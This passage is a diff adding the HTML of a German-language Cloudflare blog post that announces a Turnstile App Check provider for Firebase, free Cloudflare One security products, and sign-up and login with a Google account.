+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+	<p>Wir freuen uns, den <a href="https://developers.cloudflare.com/turnstile/extensions/google-firebase" target="_blank" rel="noopener noreferrer"><u>Cloudflare Turnstile App Check-Provider für Google Firebase</u></a> vorstellen zu können. Dieser bietet eine reibungslose Integration ohne manuelle Einrichtung. Mit dieser neuen Erweiterung können Entwickler, die Mobilgeräte- oder Webanwendungen auf Firebase erstellen, ihre Projekte mithilfe der CAPTCHA-Alternative von Cloudflare vor Bots schützen. Mit den Bot-Erkennungs- und Challenge-Funktionen von Turnstile können Sie sicherstellen, dass nur authentische menschliche Besucher mit Ihren Firebase-Backend-Diensten interagieren. So verbessern Sie sowohl die Sicherheit als auch die Nutzererfahrung. Die datenschutzfreundliche CAPTCHA-Alternative Cloudflare Turnstile unterscheidet zwischen Menschen und Bots, ohne die Nutzererfahrung zu beeinträchtigen. Turnstile arbeitet im Gegensatz zu herkömmlichen CAPTCHA-Lösungen, die Nutzer oft abschrecken, unsichtbar und bietet verschiedene Modi, um reibungslose Nutzerinteraktionen zu gewährleisten.</p>
+	<p>Die Firebase App Check-Erweiterung für Turnstile lässt sich einfach integrieren und ermöglicht es Entwicklern, die Sicherheit von Anwendungen mit minimalem Einrichtungsaufwand schnell zu verbessern. Sie ist mit unbegrenzter Nutzung in Verbindung mit der kostenlosen Tarifoption von Turnstile ebenfalls gratis. Durch die Kombination der Stärken der Backend-Dienste von Google Firebase und Turnstile von Cloudflare können Entwickler eine sichere und reibungslose Nutzererfahrung ermöglichen.</p>
+	<div class="flex anchor relative">
+		<h2 id="cloudflare-one">Cloudflare One</h2>
+		<a href="https://blog.cloudflare.com/#cloudflare-one" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+	<p><a href="https://www.cloudflare.com/zero-trust" target="_blank" rel="noopener noreferrer"><u>Cloudflare One</u></a> ist eine umfassende <a href="https://www.cloudflare.com/learning/access-management/what-is-sase" target="_blank" rel="noopener noreferrer"><u>Secure Access Service Edge (SASE)</u></a>-Plattform. Sie wurde entwickelt, um Menschen, Anwendungen, Geräte und Netzwerke im gesamten Internet zu schützen und zu vernetzen. Sie vereint unter anderem Dienste wie Zero Trust Network Access (ZTNA) und Secure Web Gateway (SWG). Cloudflare One kann jedem helfen, Menschen und Netzwerke abzusichern, Zugriffskontrolle zu verwalten, sich vor Cyberbedrohungen abzuschirmen, seine Daten zu schützen und die Performance des Netzwerk-Traffics zu verbessern, indem dieser über das globale Netzwerk von Cloudflare geleitet wird. Die Lösung ersetzt herkömmliche IT-Sicherheitsmaßnahmen durch einen cloudbasierten Ansatz zum Schutz und zur Optimierung des Zugriffs auf Firmenressourcen.</p>
+	<p>Jeder kann ab sofort kostenlos vier neue Produkte nutzen, um die Cloudflare One in den letzten zwei Jahren erweitert wurde:</p>
+	<ul>
+		<li>
+			<p><a href="https://www.cloudflare.com/learning/access-management/what-is-a-casb" target="_blank" rel="noopener noreferrer"><u>Cloud Access Security Broker (CASB)</u></a> zur Bekämpfung von Gefahren für SaaS-Anwendungen<i>.</i></p>
+		</li>
+		<li>
+			<p><a href="https://www.cloudflare.com/learning/access-management/what-is-dlp" target="_blank" rel="noopener noreferrer"><u>Schutz vor Datenverlust (Data Loss Prevention – DLP)</u></a>, damit sensible Daten nicht aus Ihrem Netzwerk oder Ihren SaaS-Anwendungen abfließen<i>.</i></p>
+		</li>
+		<li>
+			<p><a href="https://www.cloudflare.com/learning/performance/what-is-digital-experience-monitoring" target="_blank" rel="noopener noreferrer"><u>Digital Experience Monitoring</u></a>, um zu sehen, welche Erfahrungen ein Nutzer in einem beliebigen Netzwerk macht.</p>
+		</li>
+		<li>
+			<p><a href="https://www.cloudflare.com/network-services/products/magic-network-monitoring" target="_blank" rel="noopener noreferrer"><u>Magic Network Monitoring</u></a>, um den gesamten Traffic zu sehen, der Ihr Netzwerk durchläuft<i>.</i></p>
+		</li>
+	</ul>
+	<p>Dabei handelt es sich um eine Ergänzung der bereits in der Cloudflare One-Plattform enthaltenen Produkte für Netzwerksicherheit:</p>
+	<ul>
+		<li>
+			<p><a href="https://www.cloudflare.com/learning/access-management/what-is-ztna" target="_blank" rel="noopener noreferrer"><u>Access</u></a> zur Überprüfung der Identität der Nutzer, damit diese nur die für sie vorgesehenen Applikationen verwenden können.</p>
+		</li>
+		<li>
+			<p><a href="https://www.cloudflare.com/learning/access-management/what-is-a-secure-web-gateway" target="_blank" rel="noopener noreferrer"><u>Gateway</u></a> zum Schutz des Netzwerktraffics, der sowohl für das öffentliche Internet als auch für Ihr privates Netzwerk bestimmt ist.</p>
+		</li>
+		<li>
+			<p><a href="https://developers.cloudflare.com/cloudflare-one/connections/connect-networks" target="_blank" rel="noopener noreferrer"><u>Cloudflare Tunnel</u></a>, unser App-Konnektor, der sowohl cloudflared als auch WARP Connector umfasst, zur Verbindung verschiedener Anwendungen, Server und privater Netzwerke mit dem Cloudflare-Netzwerk.</p>
+		</li>
+		<li>
+			<p><a href="https://developers.cloudflare.com/cloudflare-one/connections/connect-devices/warp" target="_blank" rel="noopener noreferrer"><u>Cloudflare WARP</u></a>, unser Geräte-Agent, zur sicheren Traffic-Übermittlung von einem Laptop oder Mobilgerät ins Internet.</p>
+		</li>
+	</ul>
+	<p>Wer über ein Cloudflare-Konto verfügt, erhält automatisch 50 kostenlose Lizenzen für alle diese Produkte in seinem bei Cloudflare One angemeldeten Unternehmen. Auf unserer <a href="https://www.cloudflare.com/plans/zero-trust-services" target="_blank" rel="noopener noreferrer"><u>Seite für Zero Trust- und SASE-Tarife</u></a> erfahren Sie mehr zu unseren kostenlosen Produkten sowie zu unseren Prepaid- und Vertrags-Tarifen für Teams mit mehr als 50 Mitgliedern.</p>
+	<div class="flex anchor relative">
+		<h2 id="authenticating-with-google">Authentifizierung mit Google</h2>
+		<a href="https://blog.cloudflare.com/#authenticating-with-google" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+	<p>Das Cloudflare-Dashboard selbst ist zu einer wichtigen Ressource geworden, die geschützt werden muss. Wir verwenden deshalb viel Zeit darauf, sicherzustellen, dass die Konten von Cloudflare-Nutzern nicht kompromittiert werden.</p>
+	<p>Zu diesem Zweck haben wir die Sicherheit durch zusätzliche Authentifizierungsmethoden erhöht, darunter eine anwendungsbasierte Zwei-Faktor-Authentifizierung (2FA), Passkeys, SSO und Anmeldung über Apple. Ab sofort bieten wir die Möglichkeit, sich mit einem Google-Konto zu registrieren und einzuloggen.&nbsp;</p>
+	<p>Cloudflare unterstützt verschiedene Workflows zur Authentifizierung, die auf unterschiedliche Anwendungsfälle zugeschnitten sind. SSO und Passkeys sind die bevorzugten und sichersten Authentifizierungsmethoden. Wir sind jedoch davon überzeugt, dass die Bereitstellung von Authentifizierungsfaktoren, die stärker als Passwörter sind, eine Lücke schließen und die durchschnittliche Sicherheit für unsere Nutzer erhöhen wird. Die Anmeldung mit Google macht unseren Nutzern das Leben leichter und erspart es ihnen, sich ein weiteres Passwort merken zu müssen, wenn sie bereits mit einer Google-Identität im Web surfen.</p>
+	<p>Das Login über Google beruht auf der <a href="https://oauth.net/2" target="_blank" rel="noopener noreferrer"><u>OAuth 2.0</u></a>-Spezifikation und ermöglicht es Google, identifizierende Informationen über eine bestimmte Identität auf sichere Weise zu übermitteln. Gleichzeitig wird sichergestellt, dass tatsächlich Google diese Informationen übermittelt. So wird verhindert, dass Angreifer sich als Google ausgeben.</p>
+	<p>Das bedeutet, dass wir die Authentifizierung an Google delegieren können und so Zero-Knowledge-Angriffe direkt auf diese Cloudflare-Identität verhindern.</p>
+	<p>Wenn Sie zur Login-Seite von Cloudflare geleitet werden, wird Ihnen die folgende Schaltfläche angezeigt. Wenn Sie darauf klicken, können Sie sich für Cloudflare registrieren. Sobald dies geschehen ist, können Sie sich ohne Passworteingabe einloggen und alle vorhandenen Schutzmechanismen nutzen, die Sie bei Ihrem Google-Konto eingestellt haben.</p>
+	<figure class="kg-card kg-image-card ">
+
+		<img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6Sse03ivX432bBV01nfyUx/1ce8ace19aa3e4228735d1ca7bd3528c/Screenshot_2024-09-23_at_16.02.49.png" alt="" class="kg-image" width="1400" height="160" loading="lazy">
+
+	</figure>
+	<p>Mit Einführung dieser Funktion verwenden wir nun unsere eigenen Worker, um eine Abstraktionsebene für <a href="https://openid.net/developers/how-connect-works" target="_blank" rel="noopener noreferrer"><u>OIDC</u></a>-kompatible Identitätsanbieter (wie GitHub- und Microsoft-Konten) bereitzustellen. Somit können unsere Nutzer in der Zukunft eine stärkere Unterstützung von Verbindungen mit <a href="https://www.cloudflare.com/learning/access-management/what-is-an-identity-provider" target="_blank" rel="noopener noreferrer"><u>Identitätsanbietern (Identity Provider – IdP)</u></a> erwarten.</p>
+	<p>Zurzeit können sich nur neue Kunden, die sich bei Google registrieren, mit ihrem Google-Konto einloggen. Wir werden diese Möglichkeit aber künftig noch für weitere unserer Nutzer implementieren. So soll die Option eingeführt werden, Social Login-Anbieter zu verknüpfen/entkoppeln. Außerdem werden wir weitere Social Login-Methoden einführen. Enterprise-Nutzer mit einem etablierten SSO-Setup können diese Methode zurzeit nicht verwenden. Diejenigen mit einem etablierten SSO-Setup auf Grundlage von Google Workspace werden an ihren SSO-Flow weitergeleitet, da wir überlegen, wie wir die Access- und IdP-Richtlinien optimieren können, die eingerichtet wurden, um Ihre Cloudflare-Umgebung abzusichern.</p>
+	<p>Wenn Sie neu bei Cloudflare sind und über ein Google-Konto verfügen, ist die Nutzung von Cloudflare zum Schutz Ihrer Website, zur Erstellung eines neuen Diensts oder zum Ausprobieren eines anderen von Cloudflare angebotenen Services jetzt einfacher denn je.</p>
+	<div class="flex anchor relative">
+		<h2 id="a-safer-internet">Für mehr Sicherheit im Internet</h2>
+		<a href="https://blog.cloudflare.com/#a-safer-internet" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+	<p>Eines der Ziele von Cloudflare war schon immer, Tools für Cybersicherheit zu demokratisieren, damit jeder auch ohne die Ressourcen großer Unternehmen Inhalte bereitstellen und auf sichere Weise eine Verbindung zum Internet herstellen kann.</p>
+	<p>Wir haben beschlossen, allen Cloudflare-Nutzern eine große Reihe neuer Funktionen kostenlos zur Verfügung zu stellen, die eine breite Palette von Sicherheitsanwendungsfällen abdecken: für Web-Administratoren, Netzwerk-Administratoren und Cybersicherheits-Enthusiasten.</p>
+	<p><a href="https://dash.cloudflare.com" target="_blank" rel="noopener noreferrer"><u>Loggen Sie sich einfach bei Ihrem Cloudflare-Konto ein</u></a>, um diese neuen Angebote ab sofort zu nutzen. Wir freuen uns über Feedback in unseren <a href="https://community.cloudflare.com" target="_blank" rel="noopener noreferrer"><u>Community-Foren</u></a> und wollen in Zukunft sowohl bestehende als auch neue Funktionen weiter verbessern.</p>
+	<div class="flex anchor relative">
+		<h2 id="watch-on-cloudflare-tv">Auf Cloudflare TV ansehen</h2>
+		<a href="https://blog.cloudflare.com/#watch-on-cloudflare-tv" aria-hidden="true" class="relative sm:absolute sm:-start-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
+	<div style="position: relative; padding-top: 56.25%;">
+		<iframe src="https://customer-rhnwzxvb3mg4wz3v.cloudflarestream.com/6752c8696de5daabf2c5bdba83fb30b9/iframe?poster=https%3A%2F%2Fcustomer-rhnwzxvb3mg4wz3v.cloudflarestream.com%2F6752c8696de5daabf2c5bdba83fb30b9%2Fthumbnails%2Fthumbnail.jpg%3Ftime%3D0m2s%26height%3D600" loading="lazy" style="border: none; position: absolute; top: 0; left: 0; height: 100%; width: 100%;" allow="accelerometer; gyroscope; autoplay; encrypted-media; picture-in-picture;" allowfullscreen="true"></iframe>
+	</div>
+	<p></p>
+</div>
